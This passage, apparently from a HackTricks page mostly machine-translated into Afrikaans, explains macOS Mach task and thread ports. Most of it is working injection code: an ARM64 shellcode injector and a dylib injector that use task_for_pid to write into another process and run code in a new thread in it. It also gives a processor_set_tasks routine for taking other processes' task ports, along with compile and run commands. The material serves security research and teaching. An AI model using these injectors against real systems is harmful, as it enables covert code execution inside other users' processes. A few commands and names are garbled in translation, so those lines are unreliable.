- Roep `mach_task_self()` aan om **die naam** vir hierdie poort vir die oproepende taak te kry. Hierdie poort word slegs **geërf** oor **`exec()`**; 'n nuwe taak wat met `fork()` geskep word, kry 'n nuwe taak poort (as 'n spesiale geval, kry 'n taak ook 'n nuwe taak poort na `exec()` in 'n suid-binary). Die enigste manier om 'n taak te spawn en sy poort te kry, is om die ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) uit te voer terwyl jy 'n `fork()` doen.
- Dit is die beperkings om toegang tot die poort te verkry (van `macos_task_policy` van die binêre `AppleMobileFileIntegrity`):
- As die app **`com.apple.security.get-task-allow` regte** het, kan prosesse van die **dieselfde gebruiker toegang tot die taak poort** verkry (gewoonlik deur Xcode vir debugging bygevoeg). Die **notarization** proses sal dit nie toelaat vir produksievrystellings nie.
- Apps met die **`com.apple.system-task-ports`** regte kan die **taak poort vir enige** proses kry, behalwe die kern. In ouer weergawes is dit **`task_for_pid-allow`** genoem. Dit word slegs aan Apple-toepassings toegestaan.
- **Root kan toegang tot taak poorte** van toepassings **nie** saamgestel met 'n **harde** runtime (en nie van Apple nie).

**Die taak naam poort:** 'n Onbevoegde weergawe van die _taak poort_. Dit verwys na die taak, maar laat nie toe om dit te beheer nie. Die enigste ding wat blykbaar deur dit beskikbaar is, is `task_info()`.

### Draad Poorte

Drade het ook geassosieerde poorte, wat sigbaar is vanaf die taak wat **`task_threads`** aanroep en vanaf die verwerker met `processor_set_threads`. 'n SEND reg oor die draad poort laat toe om die funksie van die `thread_act` subsysteem te gebruik, soos:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Enige draad kan hierdie poort kry deur **`mach_thread_sef`** aan te roep.

### Shellcode Inspuiting in draad via Taak poort

Jy kan 'n shellcode kry van:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Kompileer** die vorige program en voeg die **regte** by om kode met dieselfde gebruiker in te spuit (as nie, sal jy **sudo** moet gebruik).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Vir dit om op iOS te werk, benodig jy die regte `dynamic-codesigning` om 'n skryfbare geheue uitvoerbaar te maak.

### Dylib Inspuiting in draad via Taakpoort

In macOS **draad** kan gemanipuleer word via **Mach** of deur gebruik te maak van **posix `pthread` api**. Die draad wat ons in die vorige inspuiting gegenereer het, is gegenereer met die Mach api, so **dit is nie posix-konform nie**.

Dit was moontlik om **'n eenvoudige shellcode** in te spuit om 'n opdrag uit te voer omdat dit **nie met posix** konforme apis moes werk nie, net met Mach. **Meer komplekse inspuitings** sou vereis dat die **draad** ook **posix-konform** moet wees.

Daarom, om die **draad** te **verbeter**, moet dit **`pthread_create_from_mach_thread`** aanroep wat **'n geldige pthread** sal skep. Dan kan hierdie nuwe pthread **dlopen** aanroep om **'n dylib** van die stelsel te laai, sodat dit in plaas daarvan om nuwe shellcode te skryf om verskillende aksies uit te voer, moontlik is om pasgemaakte biblioteke te laai.

Jy kan **voorbeeld dylibs** vind in (byvoorbeeld die een wat 'n log genereer en dan kan jy daarna luister):

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Draad Hijacking via Taakpoort <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In hierdie tegniek word 'n draad van die proses gehuig:

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Taakpoort Inspuiting Detectie

Wanneer `task_for_pid` of `thread_create_*` 'n teller in die struktuur taak van die kernel verhoog wat vanaf gebruikersmodus toegang kan verkry deur `task_info(task, TASK_EXTMOD_INFO, ...)` aan te roep.

## Uitsondering Poorte

Wanneer 'n uitsondering in 'n draad voorkom, word hierdie uitsondering na die aangewese uitsonderingpoort van die draad gestuur. As die draad dit nie hanteer nie, word dit na die taak uitsonderingpoorte gestuur. As die taak dit nie hanteer nie, word dit na die gasheerpoort gestuur wat deur launchd bestuur word (waar dit erken sal word). Dit word uitsondering triage genoem.

Let daarop dat aan die einde, as dit nie behoorlik hanteer word nie, die verslag gewoonlik deur die ReportCrash daemon hanteer sal word. Dit is egter moontlik vir 'n ander draad in dieselfde taak om die uitsondering te hanteer, dit is wat crash reporting tools soos `PLCreashReporter` doen.

## Ander Voorwerpe

### Horlosie

Enige gebruiker kan inligting oor die horlosie bekom, maar om die tyd in te stel of ander instellings te wysig, moet een root wees.

Om inligting te verkry, is dit moontlik om funksies van die `clock` subsysteem aan te roep soos: `clock_get_time`, `clock_get_attributtes` of `clock_alarm`\
Om waardes te wysig, kan die `clock_priv` subsysteem gebruik word met funksies soos `clock_set_time` en `clock_set_attributes`.

### Verwerkers en Verwerkerstel

Die verwerker API's laat toe om 'n enkele logiese verwerker te beheer deur funksies soos `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment` aan te roep...

Boonop bied die **verwerkerstel** API's 'n manier om verskeie verwerkers in 'n groep te groepeer. Dit is moontlik om die standaard verwerkerstel te verkry deur **`processor_set_default`** aan te roep.\
Hierdie is 'n paar interessante API's om met die verwerkerstel te kommunikeer:

- `processor_set_statistics`
- `processor_set_tasks`: Teruggee 'n reeks van stuurregte na alle take binne die verwerkerstel
- `processor_set_threads`: Teruggee 'n reeks van stuurregte na alle drade binne die verwerkerstel
- `processor_set_stack_usage`
- `processor_set_info`

Soos genoem in [**hierdie pos**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), het dit in die verlede toegelaat om die voorheen genoem beskerming te omseil om taakpoorte in ander prosesse te verkry om hulle te beheer deur **`processor_set_tasks`** aan te roep en 'n gasheerpoort op elke proses te verkry.\
Tans het jy root nodig om daardie funksie te gebruik en dit is beskerm, so jy sal slegs in staat wees om hierdie poorte op onbeveiligde prosesse te verkry.

Jy kan dit probeer met:

<details>

<summary><strong>processor_set_tasks kode</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
